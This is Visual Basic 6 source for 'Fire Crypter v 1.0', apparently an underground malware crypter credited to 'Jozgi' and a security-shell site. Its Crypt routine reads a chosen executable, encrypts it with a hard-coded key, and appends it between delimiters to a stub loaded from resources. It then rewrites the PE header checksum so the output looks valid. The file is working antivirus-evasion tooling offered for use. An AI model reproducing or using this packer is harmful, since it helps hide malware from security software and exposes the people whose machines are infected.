VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Fire Crypter v 1.0 by Jozgi"
   ClientHeight    =   2220
   ClientLeft      =   45
   ClientTop       =   405
   ClientWidth     =   6615
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2220
   ScaleWidth      =   6615
   StartUpPosition =   3  'Windows-Standard
   Begin VB.CommandButton Command2 
      Caption         =   "Exit"
      Height          =   255
      Left            =   2520
      TabIndex        =   6
      Top             =   1920
      Width           =   1095
   End
   Begin VB.CommandButton Command4 
      Caption         =   "About"
      Height          =   255
      Left            =   1320
      TabIndex        =   5
      Top             =   1920
      Width           =   1095
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Crypt"
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   1920
      Width           =   1095
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   6120
      Top             =   8400
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      Caption         =   "Choos your file :"
      Height          =   615
      Left            =   120
      TabIndex        =   1
      Top             =   1200
      Width           =   6375
      Begin VB.CommandButton Command1 
         Caption         =   "..."
         Height          =   255
         Left            =   5640
         TabIndex        =   3
         Top             =   240
         Width           =   615
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   120
         TabIndex        =   2
         Top             =   240
         Width           =   5415
      End
   End
   Begin VB.PictureBox Picture1 
      Height          =   1575
      Left            =   -120
      Picture         =   "Form1.frx":2372
      ScaleHeight     =   1515
      ScaleWidth      =   6795
      TabIndex        =   0
      Top             =   -360
      Width           =   6855
   End
   Begin VB.Label Label1 
      Caption         =   "www.security-shell.ws"
      Height          =   255
      Left            =   5040
      TabIndex        =   7
      Top             =   1920
      Width           =   1575
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Const CHECKSUM_SUCCESS              As Long = &H0
Private Const CHECKSUM_OPEN_FAILURE         As Long = &H1
Private Const CHECKSUM_MAP_FAILURE          As Long = &H2
Private Const CHECKSUM_MAPVIEW_FAILURE      As Long = &H3
Private Const CHECKSUM_UNICODE_FAILURE      As Long = &H4

Private Const INVALID_DOS_SIGNATURE         As Long = &H5
Private Const INVALID_NT_SIGNATURE          As Long = &H6
Private Const UNABLE_TO_ACCESS_FILE         As Long = &H7

Private Const IMAGE_DOS_SIGNATURE           As Long = &H5A4D&
Private Const IMAGE_NT_SIGNATURE            As Long = &H4550&
Private Const IMAGE_NT_OPTIONAL_HDR32_MAGIC As Long = &H10B&

Private Const SIZE_DOS_HEADER               As Long = &H40
Private Const SIZE_NT_HEADERS               As Long = &HF8
Private Const SIZE_SECTION_HEADER           As Long = &H28

Private Type IMAGE_DOS_HEADER
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    characteristics             As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress              As Long
    Size                        As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature                   As Long
    FileHeader                  As IMAGE_FILE_HEADER
    OptionalHeader              As IMAGE_OPTIONAL_HEADER
End Type

Private Declare Function MapFileAndCheckSum Lib "imagehlp.dll" Alias "MapFileAndCheckSumA" (ByVal Filename As String, HeaderSum As Long, CheckSum As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal L As Long)

Private m_lError As Long

'---------------------------------------------------------------------------------------
' Procedure : IsValidCheckSum
' Purpose   : Check if pe checksum is valid
' Parameters:
'             [In] sFile: Path to the PE file
'             [Out] bResult: returns true if the current checksum is valid
'             [Out] IsValidCheckSum: returns true if the function succeeds
'---------------------------------------------------------------------------------------
Public Function IsValidCheckSum(ByVal sFile As String, ByRef bResult As Boolean) As Boolean
    Dim lOriginal       As Long
    Dim lRecalculated   As Long
    Dim lRet            As Long
   
    m_lError = 0
   
    lRet = MapFileAndCheckSum(sFile, lOriginal, lRecalculated)
    If lRet = CHECKSUM_SUCCESS Then
        bResult = (lOriginal = lRecalculated)
        IsValidCheckSum = True
    Else
        m_lError = lRet
    End If
End Function

'---------------------------------------------------------------------------------------
' Procedure : FixCheckSum
' Purpose   : Read the curren PE checksum and fix it if needed
' Parameters:
'             [In] sFile: Path to the PE file
'             [Out] FixCheckSum: returns true if the function succeeds
'---------------------------------------------------------------------------------------
Public Function FixCheckSum(ByVal sFile As String) As Boolean
    Dim iFile                   As Integer
    Dim lOriginal               As Long
    Dim lRecalculated           As Long
    Dim bvData()                As Byte
    Dim lRet                    As Long
    Dim tIMAGE_DOS_HEADER       As IMAGE_DOS_HEADER
    Dim tIMAGE_NT_HEADERS       As IMAGE_NT_HEADERS
   
    On Local Error GoTo FixCheckSum_Error

    m_lError = 0

    lRet = MapFileAndCheckSum(sFile, lOriginal, lRecalculated)
   
    If lRet = CHECKSUM_SUCCESS Then
        If lOriginal = lRecalculated Then
            FixCheckSum = True
            Exit Function
        End If
        Debug.Print "OldChecksum: ", "0x" & Hex(lOriginal)
        Debug.Print "NewChecksum: ", "0x" & Hex(lRecalculated)
    Else
        m_lError = lRet
        Exit Function
    End If
   
    iFile = FreeFile
   
    Open sFile For Binary Access Read Write As iFile
   
    ReDim bvData(LOF(iFile) - 1)
   
    Get iFile, , bvData
   
    Call CopyMemory(tIMAGE_DOS_HEADER, bvData(0), SIZE_DOS_HEADER)
   
    If Not tIMAGE_DOS_HEADER.e_magic = IMAGE_DOS_SIGNATURE Then
        m_lError = INVALID_DOS_SIGNATURE
        GoTo Cleanup
    End If

    Call CopyMemory(tIMAGE_NT_HEADERS, bvData(tIMAGE_DOS_HEADER.e_lfanew), SIZE_NT_HEADERS)
   
    If Not tIMAGE_NT_HEADERS.Signature = IMAGE_NT_SIGNATURE Then
        m_lError = INVALID_NT_SIGNATURE
        GoTo Cleanup
    End If
   
    tIMAGE_NT_HEADERS.OptionalHeader.CheckSum = lRecalculated
   
    Call CopyMemory(bvData(tIMAGE_DOS_HEADER.e_lfanew), ByVal tIMAGE_NT_HEADERS, SIZE_NT_HEADERS)
   
    Seek iFile, 1
   
    Put iFile, , bvData
   
    Close iFile
   
    FixCheckSum = True

    On Error GoTo 0
    Exit Function

Cleanup:
    Close iFile
    Exit Function
   
FixCheckSum_Error:
    m_lError = UNABLE_TO_ACCESS_FILE
End Function

'---------------------------------------------------------------------------------------
' Procedure : LastError
' Purpose   : Return the last error number (error code is just for this module)
'---------------------------------------------------------------------------------------
Public Property Get LastError() As Long
    LastError = m_lError
End Property



Private Sub Command1_Click()
With CommonDialog1
.Filter = "Executable Files (*.exe) | *.exe"
.DialogTitle = "Select a cryptable file..."
.ShowOpen
End With
Text1.Text = CommonDialog1.Filename
End Sub

Private Sub Command2_Click()
End
End Sub

Private Sub Command3_Click()

Dim sStub() As Byte
sStub = LoadResData(101, "CUSTOM")

Dim org As String
org = Text1.Text

Dim realorg As String
Open org For Binary As #1
realorg = Space(LOF(1))
Get #1, , realorg
Close #1

Dim crfile As String
crfile = strEncrypt(realorg, "^!§$%")
    

Dim crypted As String
crypted = App.Path & "\crypted.exe"

Open crypted For Binary As #1
Put #1, , sStub
Put #1, , "////////////////////////////////////////"
Put #1, , crfile
Put #1, , "////////////////////////////////////////"
Close #1

FixCheckSum (crypted)
MsgBox "finish"
End Sub

Private Sub Command4_Click()
MsgBox ("Coded by Jozgi" & vbNewLine & "www.security-shell.ws")
End Sub

Private Sub Form_Load()
On Error Resume Next
Kill (App.Path & "\crypted.exe")
End Sub
